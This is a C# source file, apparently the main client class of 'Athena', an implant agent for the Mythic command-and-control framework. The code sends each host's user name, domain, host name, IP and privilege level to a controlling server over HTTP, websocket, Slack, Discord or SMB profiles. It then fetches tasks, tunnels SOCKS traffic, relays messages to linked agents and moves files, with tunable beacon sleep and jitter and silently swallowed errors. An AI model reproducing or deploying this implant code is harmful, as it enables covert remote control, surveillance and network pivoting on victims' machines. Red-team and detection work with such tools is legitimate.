#if DEBUG
#define HTTP
#endif
using Athena.Commands;
using Athena.Commands.Model;
using Athena.Models.Athena.Commands;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Athena.Plugins;
using Athena.Models;
using System.Reflection;
using Athena.Models.Config;
using Athena.Plugins;

namespace Athena
{
    public class MythicClient
    {
        public EventHandler SetSleep;
        public IConfig MythicConfig { get; set; }
        public IForwarder forwarder { get; set; }
        //public MythicConfig MythicConfig { get; set; }
        public CommandHandler commandHandler { get; set; }
        public SocksHandler socksHandler { get; set; }
        public bool exit { get; set; }
        public MythicClient()
        {
            this.exit = false;
            this.MythicConfig = GetConfig();
            this.forwarder = GetForwarder();


            this.commandHandler = new CommandHandler();
            this.commandHandler.SetSleepAndJitter += SetSleepAndJitter;
            this.commandHandler.StartForwarder += StartForwarder;
            this.commandHandler.StopForwarder += StopForwarder;
            this.commandHandler.StartSocks += StartSocks;
            this.commandHandler.StopSocks += StopSocks;
            this.commandHandler.ExitRequested += ExitRequested;
            
            this.socksHandler = new SocksHandler();

        }

        private IConfig GetConfig()
        {
#if WEBSOCKET
string profile = "AthenaWebsocket";
#elif HTTP
string profile = "Athena.Profiles.HTTP";
#elif SLACK
string profile = "AthenaSlack";
#elif DISCORD
string profile = "AthenaDiscord";
#elif SMB
string profile = "AthenaSMB";
#endif

            Assembly _tasksAsm = Assembly.Load($"{profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");

            if (_tasksAsm == null)
            {
                throw new Exception("Could not find loaded tasks assembly.");
            }
            foreach (Type t in _tasksAsm.GetTypes())
            {
                if (typeof(IConfig).IsAssignableFrom(t))
                {
                    return (IConfig)Activator.CreateInstance(t);
                }
            }
            return null;
        }


        private IForwarder GetForwarder()
        {
//#if WEBSOCKET
//string profile = "AthenaWebsocket";
//#elif HTTP
//            string profile = "Athena.Fowrwarder.SMB";
//#elif SLACK
//string profile = "AthenaSlack";
//#elif DISCORD
//string profile = "AthenaDiscord";
//#elif SMB
//string profile = "AthenaSMB";
//#endif
            string profile = "Athena.Forwarders.SMB";
            Assembly _tasksAsm = Assembly.Load($"{profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");

            if (_tasksAsm == null)
            {
                throw new Exception("Could not find loaded tasks assembly.");
            }
            foreach (Type t in _tasksAsm.GetTypes())
            {
                if (typeof(IForwarder).IsAssignableFrom(t))
                {
                    return (IForwarder)Activator.CreateInstance(t);
                }
            }
            return null;
        }

#region Communication Functions      
        /// <summary>
        /// Performa  check-in with the Mythic server
        /// </summary>
        public async Task<CheckinResponse> CheckIn()
        {
            Checkin ct = new Checkin()
            {
                action = "checkin",
                ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString(),
                os = Environment.OSVersion.ToString(),
                user = Environment.UserName,
                host = Dns.GetHostName(),
                pid = Process.GetCurrentProcess().Id.ToString(),
                uuid = Config.uuid,
                architecture = await Misc.GetArch(),
                domain = Environment.UserDomainName,
                integrity_level = Misc.getIntegrity(),
            };
            try
            {
                var responseString = await this.MythicConfig.currentConfig.Send(ct);

                if (String.IsNullOrEmpty(responseString))
                {
                    return null;
                }
                CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(responseString);
                if (cs is null)
                {
                    cs = new CheckinResponse()
                    {
                        status = "failed",
                    };
                }
                return cs;
            }
            catch (Exception e)
            {
                return new CheckinResponse();
            }
        }
        /// <summary>
        /// EventHandler to update the sleep and jitter
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void SetSleepAndJitter(object sender, TaskEventArgs e)
        {
            StringBuilder sb = new StringBuilder();
            ResponseResult result = new ResponseResult() { 
                completed = "true",
                task_id = e.job.task.id
            };
            var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(e.job.task.parameters);
            try
            {
                this.MythicConfig.sleep = int.Parse((string)sleepInfo["sleep"]);
                sb.AppendLine($"Updated sleep to: {(string)sleepInfo["sleep"]}");
                this.MythicConfig.jitter = int.Parse((string)sleepInfo["jitter"]);
                sb.AppendLine($"Updated jitter to: {(string)sleepInfo["jitter"]}");
            }
            catch
            {
                sb.AppendLine("Invalid sleep or jitter specified");
                result.status = "error";
            }
            result.user_output = sb.ToString();

            _ = commandHandler.AddResponse(result);

        }
        /// <summary>
        /// EventHandler to start the forwarder
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void StartForwarder(object sender, TaskEventArgs e)
        {
            var res = forwarder.Link(e.job, Config.uuid).Result;

            ResponseResult result = new ResponseResult()
            {
                completed = "true",
                task_id = e.job.task.id,
                user_output = res ? "Forwarder started" : "Forwarder failed to start",
            };

            _ = commandHandler.AddResponse(result);
        }
        /// <summary>
        /// EventHandler to stop the forwarder
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void StopForwarder(object sender, TaskEventArgs e)
        {
            forwarder.Unlink();
            _ = commandHandler.AddResponse(new ResponseResult
            {
                user_output = "Unlinked from agent",
                task_id = e.job.task.id,
                completed = "true",
            });
        }
        /// <summary>
        /// EventHandler to update the Sleep and Jitter
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void StartSocks(object sender, TaskEventArgs e)
        {
            if (this.socksHandler.Start().Result)
            {
                _ = this.commandHandler.AddResponse(new ResponseResult
                {
                    user_output = "Socks Started",
                    completed = "true",
                    task_id = e.job.task.id,
                });
            }
            else
            {
                _ = this.commandHandler.AddResponse(new ResponseResult
                {
                    user_output = "Failed to start socks",
                    completed = "true",
                    task_id = e.job.task.id,
                    status = "error"
                });
            }
        }
        /// <summary>
        /// EventHandler to starts socks forwarder
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void StopSocks(object sender, TaskEventArgs e)
        {
            if (this.socksHandler.Stop().Result)
            {
                _ = this.commandHandler.AddResponse(new ResponseResult
                {
                    user_output = "Socks stopped",
                    completed = "true",
                    task_id = e.job.task.id,
                });
            }
            else
            {
                _ = this.commandHandler.AddResponse(new ResponseResult
                {
                    user_output = "Failed to stop socks",
                    completed = "true",
                    task_id = e.job.task.id,
                    status = "error"
                });
            }
        }
        /// <summary>
        /// EventHandler to stop socks forwarder
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void ExitRequested(object sender, TaskEventArgs e)
        {
            _ = this.commandHandler.AddResponse(new ResponseResult
            {
                user_output = @"Wisdom's daughter walks alone. The mark of Athena burns through Rome",
                completed = "true",
                task_id = e.job.task.id,
            });
            this.exit = true;
        }

        /// <summary>
        /// Perform a get tasking action with the Mythic server to return current responses and check for new tasks
        /// </summary>
        /// <param name="jobs">List of MythicJobs</param>
        /// <param name="delegateMessages">List of DelegateMessages</param>
        /// <param name="socksMessage">List of SocksMessages</param>
        public async Task<List<MythicTask>> GetTasks(List<object> responses, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessage)
        {
            //List<ResponseResult> responseResults = GetResponses(jobs);
            GetTasking gt = new GetTasking()
            {
                action = "get_tasking",
                tasking_size = -1,
                delegates = delegateMessages,
                socks = socksMessage,
                responses = responses
            };

            try
            {
                string responseString = this.MythicConfig.currentConfig.Send(gt).Result;

                if (String.IsNullOrEmpty(responseString))
                {
                    return null;
                }

                return await HandleGetTaskingResponse(responseString);
            }
            catch (Exception e)
            {
                return null;
            }
        }
#endregion
#region Helper Functions

        /// <summary>
        /// Parse the GetTaskingResponse and forward them to the required places
        /// </summary>
        /// <param name="responseString">Response from the Mythic server</param>
        private async Task<List<MythicTask>> HandleGetTaskingResponse(string responseString)
        {
            GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
            if (gtr is null)
            {
                return null;
            }

            //Pass up socks messages
            if (gtr.socks is not null && gtr.socks.Count > 0)
            {
                try
                {
                    HandleSocks(gtr.socks);
                }
                catch (Exception e)
                {

                }
            }

            if (gtr.delegates is not null && gtr.delegates.Count > 0)
            {
                try
                {
                    HandleDelegates(gtr.delegates);
                }
                catch (Exception e)
                {

                }
            }
            if (gtr.responses is not null)
            {
                try
                {
                    HandleMythicResponses(gtr.responses);
                }
                catch (Exception e)
                {
                }
            }
            return gtr.tasks;
        }

        /// <summary>
        /// Handles SOCKS messages received from the Mythic server
        /// </summary>
        /// <param name="socks">List of SocksMessages</param>
        private async Task HandleSocks(List<SocksMessage> socks)
        {
            Task.Run(async() => Parallel.ForEach(socks, async (socks) => {
                this.socksHandler.HandleMessage(socks);
            }
            ));
        }

        /// <summary>
        /// Handle delegate messages received from the Mythic server
        /// </summary>
        /// <param name="delegates">List of DelegateMessages</param>
        private async Task HandleDelegates(List<DelegateMessage> delegates)
        {
            Parallel.ForEach(delegates, async del =>
            {
                await this.forwarder.ForwardDelegateMessage(del);
            });
        }

        /// <summary>
        /// Handle response result messages received from the Mythic server
        /// </summary>
        /// <param name="responses">List of MythicResponseResults</param>
        private async Task HandleMythicResponses(List<MythicResponseResult> responses)
        {
            Parallel.ForEach(responses, async response =>
            {
                if (await this.commandHandler.HasUploadJob(response.task_id))
                {
                    await this.commandHandler.HandleUploadPiece(response);
                }

                if (await this.commandHandler.HasDownloadJob(response.task_id))
                {
                    await this.commandHandler.HandleDownloadPiece(response);
                }
            });
        }

        /// <summary>
        /// Perform initial checkin with the Mythic server
        /// </summary>
        public async Task<CheckinResponse> handleCheckin()
        {
            int maxMissedCheckins = 3;
            int missedCheckins = 0;
            CheckinResponse res = await this.CheckIn();
            //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
            while (res == null || res.status != "success")
            {
                //Attempt checkin again
                try
                {
                    //Increment checkins
                    missedCheckins += 1;

                    if (missedCheckins == maxMissedCheckins)
                    {
                        //bye bye
                        Environment.Exit(0);
                    }

                    //Keep Trying
                    res = await this.CheckIn();
                }
                catch (Exception e)
                {
                }
                //Sleep before attempting checkin again
                await Task.Delay(await Misc.GetSleep(this.MythicConfig.sleep, this.MythicConfig.jitter) * 1000);
            }
            return res;
        }

        /// <summary>
        /// Update the agent information on successful checkin with the Mythic server
        /// </summary>
        /// <param name="res">CheckIn Response</param>
        public async Task<bool> updateAgentInfo(CheckinResponse res)
        {
            try
            {
                Config.uuid = res.id;

                if (this.MythicConfig.currentConfig.encrypted)
                {
                    //if (this.MythicConfig.currentConfig.encryptedExchangeCheck && !String.IsNullOrEmpty(res.encryption_key))
                    //{
                    //    this.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, res.encryption_key);
                    //}
                    //else
                    //{
                        this.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, this.MythicConfig.currentConfig.psk);
                    //}
                }
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }
#endregion
    }
}
